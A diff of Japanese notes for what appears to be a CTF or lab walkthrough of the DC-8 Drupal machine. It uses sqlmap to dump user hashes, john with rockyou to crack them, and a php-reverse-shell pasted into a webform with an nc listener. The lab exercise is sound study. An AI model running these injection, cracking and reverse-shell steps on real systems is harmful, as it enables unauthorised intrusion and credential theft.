@@ -1,5 +1,6 @@
 ### 論点
 - drupalでログインしてformに書き込みして、php-reverse-shell.phpを使う
+- exploitdbの使い方
 ### keyword
 - drupal,sqlmap(get),john,書込みreverseshell,exim4
 
@@ -24,16 +25,17 @@
   - `sqlmap -u http://$IP/?nid=3 -D d7db -T users -C name,pass --dump`
 - userとパスワードがわかるのでjohn
 - `sudo john --format=drupal7 pass.txt /usr/share/wordlists/rockyou.txt`
-  - pass.txtに次のを貼っておく。~は省略
-    - `$S$Dqupvjbx~` 
+  - pass.txtに次のを貼っておく。~は省略。次の下のどちらでもできる
+    - `$S$Dqupvjbx~vF`
+    - `john:$S$Dqupvjbx~vF`
   - password:turtle
 - ユーザログインはrobots.txtを参照する
 - /user/loginダッシュボードにログインする
   - john:turtle
 - ファイルに書き込んでphp-reverse-shellをする 
   - `nc -nlvp 9001`で待ち受ける
-  - contact usにアクセスする。Webformタブ、次にform settingにphp-reverse-shell.phpを貼り付ける。余計な文字unkoを入力しないとダメ。理由はわからん。Text formatはPHP codeに変更する
-  - Viewタブに移動する。Name,Email Adress,Detailsを適当に入力してSubmitを押すとプロンプトが戻ってくる
+  - `Contact us`にアクセスする。`Webform`タブ、次に`form settings`を選択する。次に<p>Thanks for ~ </p>と書いてある下にphp-reverse-shell.phpを貼り付ける。Text formatはPHP codeに変更する。次にページの下の方に`Save configuration`というボタンがあるので保存する。どこに入力するかはdrupalをよく知っていないとできないので、ここではそういうものだと覚えておく
+  - 右上の方にViewタブがあるので移動する。Name,Email Adress,Detailsを適当に入力してSubmitを押すとプロンプトが戻ってくる
 - 対話型シェルにする
 - ユーザをチェック
   - `ls -la /home` dc8userなるユーザがいる 
